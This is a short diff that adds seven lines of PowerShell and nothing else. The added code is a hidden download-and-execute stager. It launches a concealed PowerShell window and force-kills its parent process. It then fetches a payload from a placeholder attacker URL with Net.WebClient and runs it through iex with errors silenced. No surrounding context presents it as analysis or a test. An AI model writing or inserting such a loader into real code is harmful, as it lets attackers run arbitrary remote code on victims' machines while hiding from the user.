@@ -1,0 +1,7 @@
+Start-Process $PSHOME\powershell.exe -ArgumentList {
+$parentProcessId= (Get-CimInstance Win32_Process -Filter "ProcessId = $PID").ParentProcessId;
+Stop-Process -Id $parentProcessId -Force;
+${g}=[char[]](New-Object Net.WebClient).DownloadString('[ATTACKER-URL]/[SECONDNAME]');
+iex(${g}-join'');
+&{Start-Sleep -s 1.2;
+$ErrorActionPreference='SilentlyContinue'}} -WindowStyle Hidden
